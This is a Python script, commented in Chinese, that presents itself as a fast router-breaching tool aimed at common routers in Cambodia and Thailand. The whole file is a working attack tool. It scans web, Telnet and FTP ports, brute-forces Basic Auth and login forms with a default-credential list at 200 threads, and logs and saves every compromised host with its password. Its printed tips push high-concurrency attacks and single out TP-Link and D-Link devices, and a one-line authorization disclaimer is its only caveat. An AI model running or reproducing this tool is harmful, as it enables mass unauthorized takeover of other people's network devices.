#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
快速路由器打点工具
针对柬埔寨和泰国最常用路由器的快速突破
"""

import requests
import socket
import threading
import time
import json
import base64
from concurrent.futures import ThreadPoolExecutor
import random

class QuickRouterPwn:
    def __init__(self):
        # 基于统计的最有效凭据
        self.high_success_creds = [
            ('admin', 'admin'),
            ('admin', ''),
            ('admin', 'password'),
            ('admin', '1234'),
            ('admin', '123456'),
            ('root', 'admin'),
            ('root', 'root'),
            ('user', 'user'),
            ('cisco', 'cisco'),
            ('admin', 'cisco')
        ]
        
        # 快速检测端口
        self.quick_ports = [80, 8080, 443, 23, 21]
        
        # 攻击结果
        self.pwned = []
        self.failed = []
        
    def quick_scan(self, ip):
        """快速扫描单个IP"""
        for port in self.quick_ports:
            try:
                # 快速端口检测
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:  # 端口开放
                    # 快速攻击
                    result = self.quick_attack(ip, port)
                    if result:
                        return result
            except:
                continue
        return None
    
    def quick_attack(self, ip, port):
        """快速攻击"""
        # 尝试最常用的凭据
        for username, password in self.high_success_creds:
            try:
                # HTTP Basic Auth
                auth = (username, password)
                response = requests.get(
                    f'http://{ip}:{port}',
                    auth=auth,
                    timeout=3,
                    allow_redirects=True
                )
                
                if response.status_code == 200 and 'login' not in response.text.lower():
                    return {
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'method': 'HTTP Basic Auth',
                        'status': 'SUCCESS'
                    }
                
                # POST登录
                login_data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login'
                }
                
                response = requests.post(
                    f'http://{ip}:{port}/login',
                    data=login_data,
                    timeout=3,
                    allow_redirects=True
                )
                
                if response.status_code == 200 and 'login' not in response.text.lower():
                    return {
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'method': 'POST Login',
                        'status': 'SUCCESS'
                    }
                    
            except:
                continue
        
        return None
    
    def mass_pwn(self, target_list, max_threads=200):
        """批量快速打点"""
        print(f"🚀 开始快速打点 {len(target_list)} 个目标...")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(self.quick_scan, target) for target in target_list]
            
            for i, future in enumerate(futures):
                try:
                    result = future.result(timeout=10)
                    if result:
                        self.pwned.append(result)
                        print(f"✅ 成功: {result['ip']}:{result['port']} - {result['username']}:{result['password']}")
                    else:
                        self.failed.append(target_list[i])
                    
                    if (i + 1) % 50 == 0:
                        print(f"📊 已处理 {i + 1}/{len(target_list)} 个目标")
                        
                except:
                    self.failed.append(target_list[i])
        
        return self.pwned
    
    def print_results(self):
        """打印结果"""
        print(f"\n" + "="*60)
        print(f"🎯 快速打点结果")
        print(f"="*60)
        print(f"成功突破: {len(self.pwned)} 台")
        print(f"攻击失败: {len(self.failed)} 台")
        
        if self.pwned:
            print(f"\n🏆 成功突破的设备:")
            for i, pwn in enumerate(self.pwned[:20], 1):
                print(f"   {i}. {pwn['ip']}:{pwn['port']} - {pwn['username']}:{pwn['password']} - {pwn['method']}")
            
            if len(self.pwned) > 20:
                print(f"   ... 还有 {len(self.pwned) - 20} 台设备")
    
    def save_results(self, filename='quick_pwn_results.json'):
        """保存结果"""
        results = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'successful': self.pwned,
            'failed': self.failed,
            'total_pwned': len(self.pwned),
            'total_failed': len(self.failed)
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print(f"💾 结果已保存到: {filename}")

def main():
    """主函数"""
    print("🚀 快速路由器打点工具")
    print("⚠️  注意: 此工具仅用于授权的安全测试")
    
    pwner = QuickRouterPwn()
    
    # 示例目标（实际使用时替换为真实目标）
    targets = [
        '192.168.1.1',
        '192.168.0.1',
        '10.0.0.1',
        '172.16.0.1'
    ]
    
    print(f"📋 目标数量: {len(targets)} 个IP")
    
    # 开始快速打点
    results = pwner.mass_pwn(targets)
    
    # 显示结果
    pwner.print_results()
    
    # 保存结果
    pwner.save_results()
    
    print(f"\n💡 快速打点技巧:")
    print(f"   1. 优先扫描80, 8080, 443端口")
    print(f"   2. 使用最有效的默认凭据")
    print(f"   3. 高并发多线程攻击")
    print(f"   4. 快速超时避免卡顿")
    print(f"   5. 重点关注TP-Link和D-Link")

if __name__ == "__main__":
    main()